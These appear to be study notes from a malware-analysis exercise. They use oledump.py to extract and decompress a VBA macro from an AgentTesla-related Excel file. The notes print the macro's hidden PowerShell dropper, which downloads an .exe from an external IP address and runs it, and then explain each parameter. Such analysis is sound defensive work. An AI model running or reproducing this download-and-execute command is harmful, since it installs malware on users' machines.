
linux distro use for malware analysis


`Oledump.py` is a Python tool that analyzes **OLE2** files, commonly called Structured Storage or Compound File Binary Format.

**OLE** stands for **Object Linking and Embedding**

OLE2 = a container/file format that can store different pieces of data inside Microsoft Office documents, including potentially malicious macros.

![](../../assets/Pasted%20image%2020260813105204.png)
**In one sentence:**  
**VBA script = code inside Microsoft Office documents that can automate tasks—and attackers can abuse it to execute malicious actions.**


The A (index) +Numbers are called **data streams**.

```
VBA/ThisWorkbook
```

basically means:

> **"Here is a part of the VBA project associated with this Excel workbook."**


So, let's check it out! Let's run the command `oledump.py agenttesla.xlsm -s 4`. This command will run the oledump and look into the actual data stream of interest using the parameter `-s 4`,  wherein the `-s` parameter is short for `-select`  and the number four(`4`) as the data stream of interest is in the 4th place(`A4: M 688 'VBA/ThisWorkbook'`)


![](../../assets/Pasted%20image%2020260813105930.png)

`--vbadecompress`

When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format,

![](../../assets/Pasted%20image%2020260813110055.png)


![](../../assets/Pasted%20image%2020260813110851.png)

Find and replace

![](../../assets/Pasted%20image%2020260813110839.png)


```-shell-session
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
```

`-WindowStyle` parameter allows you to control how the PowerShell window  
-hidden mean window will not show to user 

powershell restrict policy The `-executionpolicy` parameter allows you to override this policy. The `bypass` means that the **execution policy is temporarily ignored**, allowing any script to run without restriction


`Invoke-WebRequest` is commonly used for downloading files from internent 

`-Uri` Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource `Doc-3737122pdf.exe` from `http://193.203.203.67/rt`/.

`-OutFile` specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.

`tart-Process` is used to execute the downloaded file that is stored in `$TempFile` after the web request.


```
$TempFile = "C:\Temp\malware.bin"
```

means:

> "Store the location of this temporary file in `$TempFile` so I don't have to type the whole path again."

